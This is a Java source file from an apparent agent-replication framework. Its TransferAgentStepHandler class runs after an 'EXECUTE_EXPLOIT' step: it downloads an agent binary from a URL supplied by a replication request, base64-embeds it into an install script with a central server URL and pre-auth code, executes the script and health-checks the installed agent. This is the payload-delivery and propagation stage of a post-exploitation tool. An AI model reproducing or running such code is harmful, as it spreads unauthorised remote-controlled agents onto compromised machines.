package com.spulido.agent.worker.step;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.spulido.agent.domain.task.StepAction;
import com.spulido.agent.domain.task.StepResult;
import com.spulido.agent.domain.task.TaskResult;
import com.spulido.agent.worker.BinaryIntegrityVerifier;
import com.spulido.agent.worker.CommandExecutor;
import com.spulido.agent.worker.ScriptTemplateService;
import com.spulido.agent.worker.http.AgentHttpClient;

public class TransferAgentStepHandler implements StepHandler {

    private static final Logger log = LoggerFactory.getLogger(TransferAgentStepHandler.class);

    private final AgentHttpClient httpClient;
    private final CommandExecutor commandExecutor;
    private final BinaryIntegrityVerifier integrityVerifier;
    private final ScriptTemplateService scriptTemplateService;

    public TransferAgentStepHandler(AgentHttpClient httpClient, CommandExecutor commandExecutor,
                                    BinaryIntegrityVerifier integrityVerifier,
                                    ScriptTemplateService scriptTemplateService) {
        this.httpClient = httpClient;
        this.commandExecutor = commandExecutor;
        this.integrityVerifier = integrityVerifier;
        this.scriptTemplateService = scriptTemplateService;
    }

    @Override
    public StepResult handle(StepAction action, Map<StepAction, StepResult> context) {
        log.info("Handling TRANSFER_AGENT step");

        StepResult replicationResult = context.get(StepAction.REQUEST_REPLICATION);
        if (replicationResult == null || replicationResult.getLogs() == null) {
            return StepResult.failure(action, List.of("No replication request result available"));
        }

        String downloadUrl = extractFromLogs(replicationResult.getLogs(), "downloadUrl:");
        String preauthCode = extractFromLogs(replicationResult.getLogs(), "preauthCode:");
        String centralUrl = extractFromLogs(replicationResult.getLogs(), "centralUrl:");

        if (downloadUrl == null) {
            return StepResult.failure(action, List.of("No download URL available from replication request"));
        }

        StepResult exploitResult = context.get(StepAction.EXECUTE_EXPLOIT);
        String targetIp = extractFromLogs(exploitResult.getLogs(), "targetIp:");

        try {
            byte[] binary = httpClient.downloadBinary(downloadUrl);
            log.info("Downloaded agent binary: {} bytes", binary.length);

            boolean integrityOk = integrityVerifier.verify(binary);
            if (!integrityOk) {
                log.error("Binary integrity verification failed");
                return StepResult.failure(action, List.of("Binary integrity verification failed"));
            }

            Map<String, String> replacements = new HashMap<>();
            replacements.put("BINARY_BASE64", java.util.Base64.getEncoder().encodeToString(binary));
            replacements.put("CENTRAL_URL", centralUrl != null ? centralUrl : "http://localhost:8080");
            replacements.put("PREAUTH_CODE", preauthCode != null ? preauthCode : "");

            String installScript = scriptTemplateService.renderTemplate("install-agent.sh.tmpl", replacements);

            TaskResult installResult = commandExecutor.execute(installScript, 30);
            if (!installResult.isSuccess()) {
                log.error("Agent installation failed: {}", installResult.getMessage());
                return StepResult.failure(action,
                        List.of("Agent installation failed: " + installResult.getMessage()));
            }

            try {
                Thread.sleep(3000);
                TaskResult healthCheck = commandExecutor.execute(
                        "curl -s http://localhost:1222/actuator/health || echo 'UNHEALTHY'", 10);
                boolean healthy = healthCheck.isSuccess() && healthCheck.getMessage() != null
                        && healthCheck.getMessage().contains("UP");

                return StepResult.success(action, List.of(), List.of(),
                        List.of("binaryTransferred:true",
                                "targetIp:" + (targetIp != null ? targetIp : "unknown"),
                                "preauthCode:" + (preauthCode != null ? preauthCode : ""),
                                "healthCheck:" + (healthy ? "PASSED" : "SKIPPED")));
            } catch (Exception e) {
                log.warn("Health check failed (non-fatal): {}", e.getMessage());
                return StepResult.success(action, List.of(), List.of(),
                        List.of("binaryTransferred:true",
                                "targetIp:" + (targetIp != null ? targetIp : "unknown"),
                                "preauthCode:" + (preauthCode != null ? preauthCode : ""),
                                "healthCheck:SKIPPED"));
            }

        } catch (Exception e) {
            log.error("Binary transfer failed", e);
            return StepResult.failure(action,
                    List.of("Binary transfer failed: " + e.getMessage()));
        }
    }

    private String extractFromLogs(List<String> logs, String prefix) {
        if (logs == null) return null;
        return logs.stream()
                .filter(l -> l.startsWith(prefix))
                .findFirst()
                .map(l -> l.substring(prefix.length()).trim())
                .orElse(null);
    }
}
